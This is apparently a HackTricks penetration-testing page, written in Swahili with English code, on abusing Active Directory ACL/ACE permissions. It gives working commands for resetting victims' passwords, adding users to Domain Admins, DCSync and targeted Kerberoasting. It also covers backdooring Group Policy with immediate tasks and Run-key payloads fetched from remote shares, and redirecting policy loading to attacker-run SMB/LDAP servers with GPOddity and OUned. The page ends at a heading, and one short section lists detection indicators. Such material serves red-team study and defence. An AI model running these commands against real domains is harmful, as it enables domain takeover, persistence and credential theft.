# Kutumia Vibaya Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, soma makala asilia.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

Kwa matumizi mabaya ya ACL za objects zilizofutwa na urejeshaji wa akaunti, angalia [urejeshaji wa AD Recycle Bin](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls).

## **Haki za GenericAll kwa Mtumiaji**

Haki hii humpa mshambulizi udhibiti kamili wa akaunti ya mtumiaji lengwa. Baada ya kuthibitisha haki za `GenericAll` kwa kutumia amri ya `Get-ObjectAcl`, mshambulizi anaweza:

- **Kubadilisha Nenosiri la Mtumiaji Lengwa**: Kwa kutumia `net user <username> <password> /domain`, mshambulizi anaweza kuweka upya nenosiri la mtumiaji.
- Kutoka Linux, unaweza kufanya vivyo hivyo kupitia SAMR kwa kutumia Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Ikiwa akaunti imezimwa, ondoa alama ya UAC**: `GenericAll` huruhusu kuhariri `userAccountControl`. Kutoka Linux, BloodyAD inaweza kuondoa alama ya `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Weka SPN kwenye akaunti ya mtumiaji ili iweze kufanyiwa kerberoasting, kisha tumia Rubeus na targetedKerberoast.py kutoa hash za ticket-granting ticket (TGT) na kujaribu kuzivunja.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Zima uthibitishaji wa awali kwa mtumiaji, na kufanya akaunti yake iwe hatarini kwa ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Ukiwa na `GenericAll` kwenye user, unaweza kuongeza credential inayotegemea certificate na kujithibitisha kama user huyo bila kubadilisha password yake. Tazama:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Privilege hii humwezesha mshambulizi kubadilisha uanachama wa makundi ikiwa ana haki za `GenericAll` kwenye kundi kama `Domain Admins`. Baada ya kutambua distinguished name ya kundi kwa kutumia `Get-NetGroup`, mshambulizi anaweza:

- **Kujiongeza kwenye Kundi la Domain Admins**: Hili linaweza kufanywa kwa kutumia commands za moja kwa moja au modules kama Active Directory au PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Kutoka Linux unaweza pia kutumia BloodyAD kujiongeza kwenye vikundi vyovyote ikiwa una ruhusa za GenericAll/Write juu yake. Ikiwa kikundi lengwa kimewekwa ndani ya “Remote Management Users”, utapata mara moja ufikiaji wa WinRM kwenye hosts zinazotambua kikundi hicho:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Kuwa na ruhusa hizi kwenye object ya computer au akaunti ya user kunaruhusu:

- **Kerberos Resource-based Constrained Delegation**: Huwezesha kuchukua udhibiti wa object ya computer.
- **Shadow Credentials**: Tumia mbinu hii kuiga akaunti ya computer au user kwa kutumia vibaya ruhusa za kuunda shadow credentials.

## Kuhamisha object kwenye ruhusa za OU zilizorithiwa

Njia inaweza kuchanganya **ruhusa za kuhamisha akaunti** na **ruhusa za kuandika zilizorithiwa kutoka OU lengwa**, hata kama principal zote mbili haziwezi mwanzoni kurekebisha attributes nyeti za akaunti hiyo. Thibitisha ruhusa za kuhamisha object chanzo na `CreateChild` kwenye OU lengwa, hamisha object, kisha kagua tena DACL yake inayotumika. Kwa mfano, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` ya powerview.py huhamisha user; kisha kikundi unachodhibiti chenye `GenericWrite` iliyorithiwa kwenye OU hiyo kinaweza kuongeza [shadow credential](shadow-credentials.md). Kuhamisha object pekee hakuundi ruhusa hiyo iliyorithiwa.<sup>[[18]](#references)</sup>

Ikiwa una `GenericAll` kwenye OU lakini hakuna ACE inayofaa iliyorithiwa, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` inaweza kuongeza moja kwa descendants wake. Jaribu akaunti lengwa kando: **akaunti zinazolindwa na AdminSDHolder zimezimwa urithishaji**, kwa hivyo ACE ya OU inaweza kuathiri users wa kawaida lakini ikashindwa kwenye user anayelindwa. Angalia [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Njia tofauti ya kutumia vibaya ipo pale script ya privileged ya kuratibiwa ya kusafisha inapochagua OUs kulingana na ACEs zinazoathiriwa na mshambuliaji, kisha kutekeleza `Set-ADObject -Clear adminCount` **na** `$acl.SetAccessRuleProtection($False, $False)` kwa descendants zake. Ikiwa unaweza kurekebisha DACL ya OU, ipe kikundi kinachokaguliwa na script ACE ya `ExtendedRight` au `GenericAll` inayohitajika; thibitisha kando kwamba unaweza kuendesha task. Task ya privileged inaweza kisha kurejesha urithishaji kwenye akaunti iliyokuwa inalindwa, na hivyo kuruhusu ACE ya OU kutumika. Thibitisha script halisi, ruhusa ya kuanzisha task, na DACL itakayopatikana; kufuta `adminCount` pekee hakuwashi tena urithishaji, na SDProp inaweza kulinda tena akaunti zinazobaki kwenye vikundi vinavyolindwa.<sup>[[18]](#references)</sup>

## **WriteProperty on Group**

Ikiwa user ana ruhusa za `WriteProperty` kwenye objects zote za kikundi maalum (kwa mfano, `Domain Admins`), anaweza:

- **Kujiongeza Mwenyewe kwenye Kikundi cha Domain Admins**: Inawezekana kwa kuchanganya amri za `net user` na `Add-NetGroupUser`; mbinu hii huwezesha kupandisha ruhusa ndani ya domain.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) on Group**

Ruhusa hii huwawezesha washambuliaji kujiongeza kwenye vikundi mahususi, kama vile `Domain Admins`, kupitia amri zinazobadilisha moja kwa moja uanachama wa kikundi. Kutumia mfuatano ufuatao wa amri huwaruhusu kujiongeza:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Haki hii inafanana na nyingine, na huwaruhusu washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kurekebisha sifa za vikundi hivyo ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitishaji na utekelezaji wa haki hii hufanywa kwa kutumia:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Kuwa na `ExtendedRight` kwa mtumiaji kuhusu `User-Force-Change-Password` huruhusu kuweka upya nenosiri bila kujua nenosiri la sasa. Haki hii inaweza kuthibitishwa na kutumiwa kupitia PowerShell au zana mbadala za mstari wa amri. Kuna njia kadhaa za kuweka upya nenosiri la mtumiaji, zikiwemo vipindi shirikishi na amri za mstari mmoja kwa mazingira yasiyo shirikishi. Amri hizo hutofautiana kuanzia matumizi rahisi ya PowerShell hadi kutumia `rpcclient` kwenye Linux, zikionyesha utofauti wa njia za mashambulizi.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner on Group**

Ikiwa mshambulizi atagundua kuwa ana haki za `WriteOwner` kwenye kikundi, anaweza kubadilisha umiliki wa kikundi hicho na kuwa mmiliki mwenyewe. Hili lina athari kubwa hasa ikiwa kikundi husika ni `Domain Admins`, kwa kuwa kubadilisha umiliki huruhusu udhibiti mpana zaidi wa sifa na uanachama wa kikundi. Mchakato huu unahusisha kutambua object sahihi kwa kutumia `Get-ObjectAcl`, kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, kwa kutumia SID au jina.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite kwa User**

Ruhusa hii humwezesha mshambuliaji kurekebisha sifa za mtumiaji. Hasa, akiwa na ufikiaji wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya logon script ya mtumiaji ili kutekeleza script hasidi mtumiaji anapoingia. Hili hufanywa kwa kutumia amri ya `Set-ADObject` kusasisha sifa ya `scriptpath` ya mtumiaji lengwa ili ielekeze kwenye script ya mshambuliaji.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

`WriteProperty` ACE yenye upeo finyu zaidi unaohusu [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) ya mtumiaji inaweza kutosha; `GenericWrite` haihitajiki. Oanisha ruhusa hiyo ya attribute na script inayoweza kuandikwa katika mti wa `SYSVOL\<domain>\scripts` au `NETLOGON` wa domain, kisha tathmini kama mtumiaji lengwa ana uwezekano wa kuingia na kufikia script. Script huendeshwa katika muktadha wa mtumiaji huyo wakati wa kuingia. Kagua ACL zinazotumika za AD na za faili/share kando; ACE ya Allow inayolingana au directory inayoweza kuandikwa pekee haithibitishi kuwa njia nzima imekamilika.

## **GenericWrite kwenye Group**

Kwa ruhusa hii, washambuliaji wanaweza kubadilisha uanachama wa group, kama vile kujiongeza wao wenyewe au kuongeza watumiaji wengine kwenye groups mahususi. Mchakato huu unahusisha kuunda credential object, kuitumia kuongeza au kuondoa watumiaji kwenye group, kisha kuthibitisha mabadiliko ya uanachama kwa kutumia amri za PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Kutoka Linux, Samba `net` inaweza kuongeza/kuondoa wanachama ikiwa una `GenericWrite` kwenye group (inafaa wakati PowerShell/RSAT hazipatikani):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Kuwa mmiliki wa AD object na kuwa na ruhusa za `WriteDACL` juu yake humwezesha mshambuliaji kujipa ruhusa za `GenericAll` juu ya object hiyo. Hili hufanywa kupitia udanganyifu wa ADSI, unaowezesha udhibiti kamili wa object hiyo na uwezo wa kurekebisha uanachama wake katika makundi. Hata hivyo, kuna vikwazo unapojaribu kutumia vibaya ruhusa hizi kwa kutumia cmdlet za `Set-Acl` / `Get-Acl` za Active Directory module.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Udhibiti wa haraka wa WriteDACL/WriteOwner (PowerView)

Ukiwa na `WriteOwner` na `WriteDacl` kwenye akaunti ya mtumiaji au akaunti ya huduma, unaweza kupata udhibiti kamili na kuweka upya nenosiri lake kwa kutumia PowerView bila kujua nenosiri la zamani:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Maelezo:
- Huenda ukahitaji kwanza kubadilisha mmiliki awe wewe ikiwa una `WriteOwner` pekee:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Thibitisha ufikiaji kwa kutumia itifaki yoyote (SMB/LDAP/RDP/WinRM) baada ya kuweka upya nenosiri.

## **Replication on the Domain (DCSync)**

Shambulizi la DCSync hutumia ruhusa mahususi za replication kwenye domain ili kujifanya Domain Controller na kusawazisha data, ikiwemo credentials za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, zinazowaruhusu washambuliaji kutoa taarifa nyeti kutoka kwenye mazingira ya AD bila kufikia Domain Controller moja kwa moja.<sup>[[5]](#references)</sup> [**Jifunze zaidi kuhusu shambulizi la DCSync hapa.**](../dcsync.md)

## Uwakilishaji wa GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Uwakilishaji wa GPO

Ufikiaji uliokabidhiwa wa kusimamia Group Policy Objects (GPOs) unaweza kusababisha hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amekabidhiwa haki za kusimamia GPO, anaweza kuwa na ruhusa kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumiwa vibaya kwa madhumuni hasidi, kama ilivyobainishwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Orodhesha Ruhusa za GPO

Ili kutambua GPO zilizosanidiwa vibaya, cmdlets za PowerSploit zinaweza kuunganishwa. Hii husaidia kugundua GPO ambazo mtumiaji mahususi ana ruhusa ya kuzisimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Kompyuta Zinazotumia Sera Fulani**: Inawezekana kubaini kompyuta ambazo GPO mahususi inatumika, jambo linalosaidia kuelewa wigo wa athari inayoweza kutokea. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Sera Zinazotumika kwenye Kompyuta Fulani**: Ili kuona sera zinazotumika kwenye kompyuta fulani, unaweza kutumia amri kama `Get-DomainGPO`.

**OUs Zinazotumia Sera Fulani**: Unaweza kutambua organizational units (OUs) zinazoathiriwa na sera fulani kwa kutumia `Get-DomainOU`.

Unaweza pia kutumia zana ya [**GPOHound**](https://github.com/cogiceo/GPOHound) kuorodhesha GPO na kutafuta matatizo ndani yake.

### Tumia Vibaya GPO - New-GPOImmediateTask

GPO zilizosanidiwa vibaya zinaweza kutumiwa kutekeleza code, kwa mfano, kwa kuunda scheduled task ya papo hapo. Hili linaweza kutumiwa kuongeza mtumiaji kwenye kikundi cha local administrators kwenye mashine zilizoathiriwa, na hivyo kuinua sana kiwango cha ruhusa:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Kutumia vibaya GPO

Moduli ya GroupPolicy, ikiwa imesakinishwa, huruhusu kuunda na kuunganisha GPO mpya, na kuweka mapendeleo kama vile thamani za registry ili kutekeleza backdoors kwenye kompyuta zilizoathiriwa. Mbinu hii inahitaji GPO isasishwe na mtumiaji aingie kwenye kompyuta ili backdoor itekelezwe:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Kutumia vibaya GPO

SharpGPOAbuse hutoa njia ya kutumia vibaya GPO zilizopo kwa kuongeza kazi au kurekebisha mipangilio bila kuhitaji kuunda GPO mpya. Zana hii inahitaji kurekebisha GPO zilizopo au kutumia zana za RSAT kuunda mpya kabla ya kutekeleza mabadiliko:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Kulazimisha Usasishaji wa Sera

Usasishaji wa GPO kwa kawaida hufanyika takribani kila baada ya dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumiwa kwenye kompyuta lengwa kulazimisha usasishaji wa sera mara moja. Amri hii huhakikisha kuwa marekebisho yoyote ya GPO yanatekelezwa bila kusubiri mzunguko unaofuata wa usasishaji wa kiotomatiki.

### Jinsi Inavyofanya Kazi Ndani

Ukaguzi wa Scheduled Tasks za GPO fulani, kama `Misconfigured Policy`, unaweza kuthibitisha kuwa kazi kama `evilTask` zimeongezwa. Kazi hizi huundwa kupitia scripts au zana za command-line zinazolenga kurekebisha tabia ya mfumo au kuongeza marupurupu.

Muundo wa kazi, kama unavyoonyeshwa kwenye faili ya usanidi ya XML iliyozalishwa na `New-GPOImmediateTask`, unaeleza maelezo ya kazi iliyopangwa - ikijumuisha amri itakayotekelezwa na vichochezi vyake. Faili hii inaonyesha jinsi kazi zilizopangwa hufafanuliwa na kusimamiwa ndani ya GPO, na hutoa njia ya kutekeleza amri au scripts za kiholela kama sehemu ya utekelezaji wa sera.

### Watumiaji na Vikundi

GPO pia huruhusu kubadilisha uanachama wa watumiaji na vikundi kwenye mifumo lengwa. Kwa kuhariri moja kwa moja faili za sera za Users and Groups, washambuliaji wanaweza kuongeza watumiaji kwenye vikundi vyenye marupurupu, kama kikundi cha ndani cha `administrators`. Hili linawezekana kupitia kukabidhiwa kwa ruhusa za usimamizi wa GPO, kunakoruhusu kurekebisha faili za sera ili kujumuisha watumiaji wapya au kubadilisha uanachama wa vikundi.

Faili ya usanidi ya XML ya Users and Groups inaonyesha jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza maingizo kwenye faili hii, watumiaji mahususi wanaweza kupewa marupurupu ya juu kwenye mifumo iliyoathiriwa. Mbinu hii hutoa njia ya moja kwa moja ya kuongeza marupurupu kupitia uchezeshaji wa GPO.

Kwa mipangilio ya usalama kama vile uanachama wa vikundi vya ndani na haki za watumiaji, kagua pia kiolezo cha GPO kilichotumika kwenye `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` na ACL ya saraka ya `SecEdit`. Saraka au faili inayoweza kuandikwa ni kidokezo cha kuchunguza: ufikiaji halisi wa share ya SYSVOL, ACL za deny na zilizorithiwa, ruhusa za Group Policy container, wigo wa sera, na usasishaji wa mteja bado huamua kama mabadiliko yanaweza kutekelezwa. Uanachama katika kikundi kinachoitwa “GPO Managers” pekee hauthibitishi kuwa una haki za kuhariri. [Microsoft inaandika kuhusu njia hii ya kiolezo na mgawanyo kati ya Group Policy container na kiolezo.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Zaidi ya hayo, mbinu nyingine za kutekeleza code au kudumisha persistence, kama kutumia scripts za logon/logoff, kurekebisha registry keys za autoruns, kusakinisha software kupitia faili za .msi, au kuhariri usanidi wa huduma, zinaweza pia kuzingatiwa. Mbinu hizi hutoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo lengwa kupitia matumizi mabaya ya GPO.

### Kuelekeza upatikanaji wa GPC/GPT kwenye huduma hasidi zilizothibitishwa

GPO ina **Group Policy Container (GPC)** ya LDAP iliyo na metadata na **Group Policy Template (GPT)** inayohifadhiwa kwenye SMB na iliyo na faili za sera. Wakati wa usasishaji, mteja hufuata `gPLink` ya container, husoma GPC iliyorejelewa na `gPCFileSysPath` yake, kisha hupakua GPT kutoka kwenye njia hiyo ya UNC. Kwa hiyo, ufikiaji wa kuandika kwenye GPC yenyewe au `gPLink` ya OU, Site au Domain unaweza kutumiwa kusababisha uchakataji wa sera wenye marupurupu.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Kuharibu `gPCFileSysPath` kwa kutumia GPOddity

Ikiwa principal anayedhibitiwa anaweza kuandika kwenye GPC lengwa (moja kwa moja au kupitia **NTLM relay to LDAP**), badilisha `gPCFileSysPath` iwe UNC path inayohifadhiwa na mshambuliaji. [GPOddity](https://github.com/synacktiv/GPOddity) hujiendesha yenyewe kufanya mabadiliko ya LDAP na kuhudumia GPT hasidi iliyo na faili za sera zinazotumia modules au Immediate Task ambayo Group Policy client hutekeleza kama `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Share ya SMB isiyohitaji uthibitishaji au isiyojali credentials haitoshi kwenye Windows clients za sasa: SMB Secure Negotiate huhitaji uthibitisho kuwa uthibitishaji umefaulu, kwa hivyo huduma hasidi lazima ithibitishe utambulisho wa domain, itoe ufunguo wa kipindi cha SMB na isaini majibu yake ipasavyo. Katika embedded mode, sanidi GPOddity itumie machine account inayodhibitiwa na ufunguo wake wa huduma, kisha uchague payload ya upande wa kompyuta au mtumiaji kwenye sehemu ya `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Kesi ya kipekee ya User GPO:** baada ya MS16-072, Windows bado huunda sessions mbili za SMB2 katika **TCP connection ileile**: user session husoma `GPT.INI`, kisha computer-account session husoma configuration inayotumika kama vile `ScheduledTasks.xml`. Kwa hiyo, server hasidi lazima iorodheshe hali ya authentication, session keys na signing keys kulingana na SMB2 `SessionId`, si kwa socket pekee. Scapy fork iliyojumuishwa katika GPOddity/OUned hutekeleza hili kupitia `SMBStreamSocketMultiplexing` na `SMBServer` inayotambua multiplexing; server za Impacket/Scapy za session moja hutumia tena hali isiyo sahihi ya signing na hushindwa kutumia user policies.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning kwa kutumia OUned

Kwa `WriteGPLink`, `GenericWrite` au udhibiti sawia wa OU, Site au Domain, mshambuliaji anaweza kuongeza link ambayo GPC DN yake inatolewa na LDAP host inayodhibitiwa na mshambuliaji. Mbinu hii iliwasilishwa awali na Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) huendesha kiotomatiki uandishi wa LDAP na mnyororo hasidi wa GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Mwathiriwa kwanza hujithibitisha kwa huduma hasidi ya LDAP na kupokea GPC ambayo `gPCFileSysPath` yake inaelekeza kwenye huduma hasidi ya SMB; kisha hujithibitisha kwa SMB na kutumia GPT iliyotolewa. Kwa hivyo, OUned inahitaji akaunti yenye LDAP SPN, akaunti ya mashine yenye HOST SPN ya SMB (akaunti hiyo hiyo ya mashine inaweza kutimiza mahitaji yote mawili), na DNS resolution au reverse forwarding inayoelekeza porti 389 na 445 kwenye host ya operator.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned's Scapy LDAP server iliyopachikwa huthibitisha Kerberos/SPNEGO kwa kutumia service key halisi inayodhibitiwa na hutoa GPC data yoyote kutoka JSON. Key tupu ya JSON huwakilisha rootDSE, viambishi awali vya `base64:` huwakilisha thamani za binary, na server inasaidia add/delete/modify/search pamoja na utafutaji wa `BASE`, `LEVEL` na `SUBTREE`; inaweza kujadiliana bila ulinzi, kwa integrity au confidentiality. Hii hufanya service iweze kutumiwa tena pale Windows component nyingine inapofuata LDAP reference inayodhibitiwa na mshambuliaji lakini ikahitaji LDAP iliyothibitishwa.<sup>[[15]](#references)</sup>

Usidhani kwamba kusawazisha password ya akaunti kwenye dummy domain kunazalisha upya kila Kerberos key: RC4 hutokana na password, ilhali AES string-to-key pia hutumia salt inayotokana na hostname/domain ya principal. Kutoa AES key halisi ya akaunti kwa `KerberosSSP` huepusha kulazimisha RC4 kupitia mabadiliko yanayotambulika kwenye `msDS-SupportedEncryptionTypes` ya akaunti ya mashine inayoweza kujiandikia yenyewe.<sup>[[15]](#references)</sup>

#### Vigezo vya uchunguzi

Linganisha mabadiliko ya `gPCFileSysPath` au `gPLink` na mabadiliko ya toleo la GPO pamoja na Immediate/Scheduled Task XML mpya. Chunguza viungo vinavyoelekeza kwenye naming context zisizotarajiwa, UNC hosts zilizo nje ya seti iliyoidhinishwa ya DC/SYSVOL, DNS records zinazoelekeza upya majina ya akaunti za mashine, service tickets za LDAP/CIFS kwa akaunti za mashine zisizo za kawaida, na mabadiliko ya `msDS-SupportedEncryptionTypes` yanayowezesha RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + utekaji wa njia ya UNC (ARP spoofing)

`WriteGPLink` kwenye OU/domain hukuwezesha kurekebisha attribute ya `gPLink` ya container lengwa na **kulazimisha GPO iliyopo itumike** bila kuhariri GPO yenyewe. Hili huwa muhimu pale GPO iliyounganishwa tayari inaporejelea maudhui ya mbali kupitia **UNC paths** (`\\HOST\share\...`), kwa sababu watumiaji waliothibitishwa wanaweza kusoma **SYSVOL** na kutafuta sera zinazoweza kutumiwa tena wakiwa offline.<sup>[[11]](#references)</sup>

Mtiririko wa kazi wa kiwango cha juu:

1. Tumia BloodHound kubaini principal yenye `WriteGPLink` kwenye OU na kuorodhesha kompyuta/watumiaji walio ndani ya OU hiyo.
2. Nakili `SYSVOL` kwa ruhusa ya kusoma pekee na uchanganue GPO ukitafuta **Software Installation**, **drive mappings** (`Drives.xml`), na **logon/startup scripts** zinazorejelea UNC paths.
3. Pendelea sera zinazoelekeza kwenye **hostname ya moja kwa moja** (kwa mfano `\\DC02\share\pkg.msi`) badala ya DFS/domain-namespace paths, kwa sababu njia zinazotumia hostname ni rahisi zaidi kuelekezwa upya kwa L2 spoofing.
4. Ongeza GUID ya GPO iliyochaguliwa kwenye `gPLink` ya OU lengwa ili victim ichakate sera hiyo iliyopo.
5. Kwenye broadcast domain hiyo hiyo, fanya ARP spoofing ya UNC host na uunganishe IP yake ndani ya mashine yako (`ip addr add <target_ip>/32 dev <iface>`) ili SMB traffic ya victim ifike kwenye host yako.
6. Toa njia/jina la faili linalotarajiwa kutoka kwa attacker SMB server (kwa mfano `smbserver.py`) na usubiri uchakataji wa kawaida wa sera.

Mfano wa ukusanyaji wa `SYSVOL` na ulinganishaji wa GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Unganisha GPO iliyopo na OU lengwa:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

